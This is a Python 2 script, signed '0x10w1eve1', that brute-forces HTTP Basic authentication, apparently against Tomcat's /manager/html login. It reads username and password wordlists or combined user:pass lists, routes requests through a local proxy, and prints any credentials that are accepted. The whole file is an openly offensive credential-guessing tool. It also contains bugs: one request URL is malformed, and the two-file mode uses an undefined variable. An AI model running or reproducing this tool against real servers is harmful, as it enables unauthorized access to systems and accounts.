
import sys
import base64
import subprocess
from subprocess import CalledProcessError
import multiprocessing
from multiprocessing import Process
import requests

proxy = {"http":"http://127.0.0.1:8080"}

def check_resp(stream):# check if we are redirected back to the login prompt.
	if stream.status_code==401 or stream.status_code==403:
		return False
	else:
		return True # return true if logged in


def guess(password,username,ip,port):
	#print '[*] trying password ....%s....'%password
	encoded=base64.b64encode('%s:%s'%(username,password))
	req=requests.post('http://%s/:%s'%(ip,port),headers={'Authorization':'Basic %s'%encoded})
	if check_resp(req):
		print '[+] Found Password!!!:::::===> %s'%password
		sys.exit()

def guess_onefile(userpass,ip,port):#for files where its user:pass
	encoded=base64.b64encode(userpass.strip())
	req=requests.get('http://%s:%s/manager/html'%(ip,port),headers={'Host':'%s:%s'%(ip,port),'Referer':'http://%s:%s/'%(ip,port),'Authorization':'Basic %s'%encoded},proxies=proxy)
	if check_resp(req):
		print '[+] Found Creds!!!:::::===> %s'%userpass
		sys.exit()


def brute_force_2files(user_list,pass_list,ip,port):
	wc=0
	wct=0
	#get total words in list
	for i in pass_list:
		wct+=1
	pass_list.seek(0)

	for username in user_list:
		print '[**] BruteForce with username:::%s:::'%username.strip()
		for password in pass_list:
			print '[*] Trying %s/%s password(s)'%(wc,wct) # display curr/total count
			guess(password.strip(),username.strip(),ip,port)
			wc+=1 #increment curr count
		pass_list.seek(0)

def brute_force_onefile(userpasslist,ip,port):
	wc=0
	wct=0
	#get total words in list
	for i in userpasslist:
		wct+=1
	userpasslist.seek(0)

	for creds in userpasslist:
		print '[*] BruteForce with Creds: %s  (%s/%s)'%(creds.strip(),wc,wct) # display curr/total count'%creds.strip()
		guess_onefile(creds,ip,port)
		wc+=1 #increment curr count
		

#######################################################################################################
Usage = "\nUsage: %s <user:pass list> <ip> <port> OR <password-list> <username-list> <ip> <port>\n"%sys.argv[0]


if len(sys.argv)==4:
	userpasslist=open(sys.argv[1],'r')
	ip=sys.argv[2]
	port=sys.argv[3]
	brute_force_onefile(userpasslist,ip,port)
elif len(sys.argv)==5:
	pass_list=open(sys.argv[2],'r')
	user_list=open(sys.argv[1],'r')
	target=sys.argv[3]
	port=sys.argv[4]
	brute_force_2files(user_list,pass_list,ip,port)
else:
	print Usage
	print '[!] Change headers in all requests accordingly'
	sys.exit()






#stream=urllib3.PoolManager()


### 0x10w1eve1 ###
